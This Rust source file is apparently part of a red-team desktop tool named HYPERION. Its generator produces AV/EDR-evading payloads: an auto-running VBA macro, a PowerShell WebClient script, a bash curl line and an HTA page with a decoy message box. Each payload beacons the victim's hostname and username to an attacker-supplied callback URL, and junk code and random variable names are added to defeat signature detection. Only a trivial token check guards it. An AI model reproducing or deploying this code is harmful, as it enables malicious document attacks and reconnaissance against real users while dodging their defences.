// src-tauri/src/payload_gen.rs
// Polymorphic payload generator: same semantics, different byte profile each time
// Increases evasion against signature-based AV/EDR
use rand::Rng;
use serde::{Deserialize, Serialize};
use tauri::State;


#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PayloadSpec {
    pub payload_type: String,   // "hta" | "vba" | "powershell" | "bash"
    pub callback_url: String,
    pub decoy_text: String,
    pub permit_token: String,
    pub mutation_level: u8,     // 1=light, 2=medium, 3=aggressive
}


#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct GeneratedPayload {
    pub format: String,
    pub filename: String,
    pub content_b64: String,
    pub mutation_id: String,
    pub permit_number: String,
}


/// XOR encode string with random key (changes byte signature each generation)
fn xor_encode(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter().zip(key.iter().cycle()).map(|(b, k)| b ^ k).collect()
}


/// Generate random variable name (junk variables to change signature)
fn rnd_var(rng: &mut impl Rng) -> String {
    const CHARS: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
    let len = rng.gen_range(5..=12);
    (0..len).map(|_| CHARS[rng.gen_range(0..CHARS.len())] as char).collect()
}


/// Insert junk code lines to change byte profile
fn insert_junk(code: &str, rng: &mut impl Rng, count: u8) -> String {
    let junk_vbs = [
        "Dim {v} : {v} = {n}",
        "If {n} > 99999 Then {v} = True End If",
        "For {v} = 1 To {n} : Next",
    ];
    let mut result = code.to_string();
    for _ in 0..count {
        let v = rnd_var(rng);
        let n: u32 = rng.gen_range(1000..99999);
        let junk = junk_vbs[rng.gen_range(0..junk_vbs.len())]
            .replace("{v}", &v).replace("{n}", &n.to_string());
        result = format!("{}\n{}", junk, result);
    }
    result
}


#[tauri::command]
pub fn generate_polymorphic_payload(
    spec: PayloadSpec,
    log_state: State<'_, crate::LogState>,
) -> Result<GeneratedPayload, String> {
    if spec.permit_token.trim().len() < 8 {
        return Err("Unauthorized: provide valid permit token".to_string());
    }


    let mut rng = rand::thread_rng();
    let mutation_id: String = (0..8).map(|_| format!("{:x}", rng.gen::<u8>())).collect();
    let watermark = format!("HYPERION permit={} mutation={} {}",
        &spec.permit_token[..8], mutation_id, chrono::Utc::now().to_rfc3339());


    let raw_code = match spec.payload_type.as_str() {
        "vba" => {
            // Base VBA beacon
            let base = format!(r#"Sub AutoOpen()
  ' HYPERION {wm}
  On Error Resume Next
  Dim {req} As Object
  Set {req} = CreateObject("MSXML2.ServerXMLHTTP.6.0")
  {req}.Open "GET", "{cb}?d=" & Environ("COMPUTERNAME") & "&u=" & Environ("USERNAME"), False
  {req}.Send
End Sub"#,
                req = rnd_var(&mut rng),
                wm = watermark, cb = spec.callback_url);


            // Apply mutation
            if spec.mutation_level >= 2 {
                insert_junk(&base, &mut rng, spec.mutation_level as u8 * 3)
            } else { base }
        },
        "powershell" => {
            let b64_cb = base64::engine::general_purpose::STANDARD.encode(
                spec.callback_url.as_bytes());
            let ps_var1 = rnd_var(&mut rng);
            let ps_var2 = rnd_var(&mut rng);
            format!(r#"# HYPERION {wm}
${v1} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{cb_b64}'))
${v2} = New-Object System.Net.WebClient
${v2}.DownloadString("${v1}?h=$env:COMPUTERNAME&u=$env:USERNAME") | Out-Null"#,
                v1=ps_var1, v2=ps_var2,
                cb_b64=b64_cb, wm=watermark)
        },
        "bash" => {
            format!(r#"#!/bin/bash
# HYPERION {wm}
{v}=$(curl -s "{cb}?h=$(hostname)&u=$(whoami)" 2>/dev/null || true)"#,
                v=rnd_var(&mut rng), wm=watermark, cb=spec.callback_url)
        },
        _ => {  // HTA default
            let hta_var = rnd_var(&mut rng);
            format!(r#"<html><head><title>{title}</title>
<HTA:APPLICATION APPLICATIONNAME="{title}" BORDER="none"/></head>
<body><!-- HYPERION {wm} -->
<script language="VBScript">
Sub Window_OnLoad
  On Error Resume Next
  Dim {v}
  Set {v} = CreateObject("MSXML2.XMLHTTP")
  {v}.Open "GET", "{cb}?h=" & CreateObject("WScript.Network").ComputerName, False
  {v}.Send
  MsgBox "{decoy}", 64, "{title}"
  window.close
End Sub</script></body></html>"#,
                v=hta_var, wm=watermark,
                cb=spec.callback_url,
                title=spec.decoy_text, decoy=spec.decoy_text)
        }
    };


    use base64::Engine;
    let content_b64 = base64::engine::general_purpose::STANDARD.encode(raw_code.as_bytes());
    let ext = match spec.payload_type.as_str() {
        "vba" => "bas", "powershell" => "ps1", "bash" => "sh", _ => "hta"
    };
    let filename = format!("payload_{}_{}.{}", mutation_id, chrono::Utc::now().timestamp(), ext);


    // Save to vault
    let dir = crate::get_vault_path().join("payloads");
    let _ = std::fs::create_dir_all(&dir);
    let _ = std::fs::write(dir.join(&filename), &raw_code);


    crate::push_runtime_log(&log_state, format!(
        "PAYLOAD_GEN|type={}|mutation={}|permit={}",
        spec.payload_type, mutation_id, &spec.permit_token[..8]));


    Ok(GeneratedPayload {
        format: spec.payload_type,
        filename,
        content_b64,
        mutation_id,
        permit_number: spec.permit_token[..8].to_string(),
    })
}


#[tauri::command]
pub fn list_generated_payloads() -> Vec<serde_json::Value> {
    let dir = crate::get_vault_path().join("payloads");
    std::fs::read_dir(&dir).ok()
        .map(|entries| entries.filter_map(|e| {
            let e = e.ok()?;
            let meta = e.metadata().ok()?;
            Some(serde_json::json!({
                "filename": e.file_name().to_string_lossy(),
                "size_bytes": meta.len(),
                "created": meta.created().ok()
                    .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                    .map(|d| d.as_secs()),
            }))
        }).collect())
        .unwrap_or_default()
}

